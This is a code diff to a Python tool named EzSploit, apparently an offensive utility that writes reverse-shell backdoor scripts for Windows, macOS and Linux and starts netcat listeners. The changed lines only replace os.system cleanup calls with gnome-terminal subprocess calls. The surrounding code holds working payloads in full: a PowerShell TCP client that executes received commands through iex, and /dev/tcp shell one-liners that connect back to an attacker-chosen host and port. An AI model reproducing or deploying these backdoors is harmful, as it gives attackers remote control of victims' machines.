@@ -1,4 +1,5 @@
 import os
+import subprocess
 from colorama import Fore, Style
 
 def main():
@@ -18,7 +19,7 @@ def main():
                             '--`          (/-(/`  `mm---'
                 ''' + Fore.RED + Style.BRIGHT + "EzSploit " + Fore.WHITE + "v1.0" + Style.NORMAL
         
-        os.system("rm temp/windows/* && rm temp/macos/* && rm temp/linux/* && rm temp/server/*")
+        subprocess.call(['gnome-terminal', '-e', 'rm temp/windows/* && rm temp/macos/* && rm temp/linux/* && rm temp/server/*'])
         os.system("clear")
         print(logo)  
         
@@ -92,13 +93,14 @@ def main():
                             elif cinput == "exploit" or cinput == "run":
                                 if os.path.isfile(os.path.join("temp/windows", "lhost")) and os.path.isfile(os.path.join("temp/windows", "lport")) and os.path.isfile(os.path.join("temp/windows", "ratname")):
                                     rat = "Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport + "));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-                                    os.system("rm temp/windows/*")
+                                    subprocess.call(['gnome-terminal', '-e', 'rm temp/windows/*'])
                                     with open(f"RAT/Windows/{ratname}.ps1", "w") as file:
                                         file.write(rat)
                                         file.close()
                                         print(Fore.YELLOW + Style.BRIGHT + ">\t" + Fore.RED + "Backdoor: " + Fore.WHITE + f"Backdoor/Windows/{ratname}.ps1" + Style.NORMAL)
                                         print(Fore.YELLOW + f">\tAllow the {lport} on your Firewall!")
-                                    os.system("rm temp/windows/*")
+                                    subprocess.call(['gnome-terminal', '-e', 'rm temp/windows/*'])
+                                    
                                     windows()
                                 
                                 else:
@@ -108,10 +110,11 @@ def main():
                                     
                         
                             elif cinput == "back":
-                                os.system("rm temp/windows/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/windows/*'])
                                 dashboard()
                             
                             elif cinput == "exit" or cinput == "quit":
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/windows/*'])
                                 os.system("clear")
                                 exit()
                                 
@@ -198,13 +201,13 @@ def main():
                             elif cinput == "exploit" or cinput == "run":
                                 if os.path.isfile(os.path.join("temp/macos", "lhost")) and os.path.isfile(os.path.join("temp/macos", "lport")) and os.path.isfile(os.path.join("temp/macos", "ratname")):
                                     rat = "0<&196;exec 196<>/dev/tcp/"+ lhost + "/" + lport + "; sh <&196 >&196 2>&196"
-                                    os.system("rm temp/macos/*")
+                                    subprocess.call(['gnome-terminal', '-e', 'rm temp/macos/*'])
                                     with open(f"RAT/MacOS/{ratname}.sh", "w") as file:
                                         file.write(rat)
                                         file.close()
                                         print(Fore.YELLOW + Style.BRIGHT + ">\t" + Fore.RED + "Backdoor: " + Fore.WHITE + f"Backdoor/MacOS/{ratname}.ps1" + Style.NORMAL)
                                         print(Fore.YELLOW + f">\tAllow the {lport} on your Firewall!")
-                                    os.system("rm temp/macos/*")
+                                    subprocess.call(['gnome-terminal', '-e', 'rm temp/macos/*'])
                                     mac()
                                 
                                 else:
@@ -212,10 +215,11 @@ def main():
                                     mac()
                             
                             elif cinput == "back":
-                                os.system("rm temp/macos/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/macos/*'])
                                 dashboard()
                                 
                             elif cinput == "exit" or cinput == "quit":
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/macos/*'])
                                 os.system("clear")
                                 exit()
                                 
@@ -303,13 +307,13 @@ def main():
                             elif cinput == "exploit" or cinput == "run":
                                 if os.path.isfile(os.path.join("temp/linux", "lhost")) and os.path.isfile(os.path.join("temp/linux", "lport")) and os.path.isfile(os.path.join("temp/linux", "ratname")):
                                     rat = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-                                    os.system("rm temp/linux/*")
+                                    subprocess.call(['gnome-terminal', '-e', 'rm temp/linux/*'])
                                     with open(f"RAT/Linux/{ratname}.sh", "w") as file:
                                         file.write(rat)
                                         file.close()
                                         print(Fore.YELLOW + Style.BRIGHT + ">\t" + Fore.RED + "Backdoor: " + Fore.WHITE + f"Backdoor/Linux/{ratname}.sh" + Style.NORMAL)
                                         print(Fore.YELLOW + f">\tAllow the {lport} on your Firewall!")
-                                    os.system("rm temp/linux/*")
+                                    subprocess.call(['gnome-terminal', '-e', 'rm temp/linux/*'])
                                     linux()
                                         
                                 else:
@@ -317,7 +321,7 @@ def main():
                                     linux()
 
                             elif cinput == "back":
-                                os.system("rm temp/linux/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/linux/*'])
                                 dashboard()
                                 
                             elif cinput == "exit" or cinput == "quit":
@@ -387,12 +391,12 @@ def main():
                                         listener_windows()
                                 
                             elif cinput == "listen" or cinput == "run":
-                                os.system("rm temp/listener/windows/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/listener/windows/*'])
                                 os.system(f"nc -lnvp {lport}")
                                 listener_windows()
                         
                             elif cinput == "back":
-                                os.system("rm temp/listener/windows/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/listener/windows/*'])
                                 dashboard()
                             
                             elif cinput == "clear" or cinput == "cls":
@@ -462,12 +466,12 @@ def main():
                                         listener_macos()
                                 
                             elif cinput == "listen" or cinput == "run":
-                                os.system("rm temp/listener/macos/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/listener/macos/*'])
                                 os.system(f"nc -lnvp {lport}")
                                 listener_macos()
                         
                             elif cinput == "back":
-                                os.system("rm temp/listener/macos/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/listener/macos/*'])
                                 dashboard()
                             
                             elif cinput == "clear" or cinput == "cls":
@@ -537,12 +541,12 @@ def main():
                                         listener_linux()
                                 
                             elif cinput == "listen" or cinput == "run":
-                                os.system("rm temp/listener/linux/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/listener/linux/*'])
                                 os.system(f"nc -lnvp {lport}")
                                 listener_linux()
                         
                             elif cinput == "back":
-                                os.system("rm temp/listener/linux/*")
+                                subprocess.call(['gnome-terminal', '-e', 'rm temp/listener/linux/*'])
                                 dashboard()
                             
                             elif cinput == "clear" or cinput == "cls":
@@ -621,7 +625,7 @@ def main():
             try:          
                 dashboard()
             except KeyboardInterrupt:
-                os.system("rm temp/windows/* && rm temp/macos/* && rm temp/linux/* && rm temp/server/*")
+                subprocess.call(['gnome-terminal', '-e', 'rm temp/windows/* && rm temp/macos/* && rm temp/linux/* && rm temp/server/*'])
                 os.system("clear")
                 exit()
             dashboard()
